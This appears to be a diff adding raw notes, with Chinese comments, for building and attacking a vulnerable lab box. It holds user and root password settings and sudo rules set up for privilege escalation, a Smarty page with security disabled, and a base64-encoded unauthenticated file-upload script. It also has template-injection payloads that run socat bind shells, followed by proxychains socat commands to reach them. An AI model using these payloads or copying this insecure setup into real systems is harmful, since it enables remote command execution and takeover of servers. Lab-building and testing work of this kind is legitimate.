@@ -1,0 +1,54 @@
+addgroup lanyangyang
+adduser -D -G lanyangyang -s /bin/bash -h /home/lanyangyang lanyangyang
+echo "lanyangyang:2pezUxZE8hq2TKC2IdBTk7k0" | chpasswd
+
+# 注意!!表示上一条命令的完整内容
+echo 'root:!!hello!!' | chpasswd
+
+
+www-data ALL=(lanyangyang) NOPASSWD:/usr/bin/nice
+lanyangyang ALL=(ALL) NOPASSWD:/usr/bin/arp-scan
+
+
+
+root@localhost:/var/www/html# cp -r /tmp/smarty/libs ./smarty
+root@localhost:/var/www/html# mkdir -p templates templates_c cache configs
+root@localhost:/var/www/html# chmod -R 777 templates_c cache
+root@localhost:/var/www/html# chown -R apache:apache /var/www/html
+
+cat > /var/www/html/index.php << 'EOF'
+<?php
+require 'smarty/Smarty.class.php';
+
+$smarty = new Smarty();
+
+$smarty->setTemplateDir(__DIR__ . '/templates');
+$smarty->setCompileDir(__DIR__ . '/templates_c');
+$smarty->setCacheDir(__DIR__ . '/cache');
+$smarty->setConfigDir(__DIR__ . '/configs');
+
+$smarty->disableSecurity();
+
+$user_input = $_GET['input'] ?? 'Hello World';
+$smarty->assign('input', $user_input);
+
+$smarty->display('index.tpl');
+?>
+EOF
+
+
+file_put_contents('upload.php',base64_decode('PD9waHAKJHVwbG9hZF9wYXRoID0gIi92YXIvd3d3L2h0bWwvIjsKCmlmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pKSB7CiAgICAkZmlsZW5hbWUgPSBiYXNlbmFtZSgkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSk7CiAgICAkdGFyZ2V0ICAgPSAkdXBsb2FkX3BhdGggLiAiLyIgLiAkZmlsZW5hbWU7CgogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICR0YXJnZXQpKSB7CiAgICAgICAgZWNobyAiVXBsb2FkIHN1Y2Nlc3M6ICR0YXJnZXQiOwogICAgfSBlbHNlIHsKICAgICAgICBlY2hvICJVcGxvYWQgZmFpbGVkIjsKICAgIH0KfQo/Pgo8Zm9ybSBtZXRob2Q9IlBPU1QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgPGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiPgogICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+CjwvZm9ybT4KCg=='));
+
+
+{{['socat TCP-LISTEN:4444,fork,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane']|filter('system')}}
+# 更稳定的监听方式
+socat TCP-LISTEN:4444,fork,reuseaddr EXEC:'bash -li',pty,stderr,setsid,sigint,sane
+{{['socat TCP-LISTEN:4444,fork,reuseaddr EXEC:'bash -li',pty,stderr,setsid,sigint,sane']|filter('system')}}
+proxychains socat TCP:127.0.0.1:4444 SYSTEM:'bash -i',pty,stderr
+
+
+
+{{['socat TCP-LISTEN:4446,fork,reuseaddr EXEC:\'bash -li\',pty,stderr,setsid,sigint,sane']|filter('system')}}
+proxychains socat TCP:127.0.0.1:4446 SYSTEM:'bash -i',pty,stderr
+proxychains socat TCP:127.0.0.1:4446 PTY,link=/tmp/tty$$,raw,echo=0 SYSTEM:'bash -li',pty,stderr
+
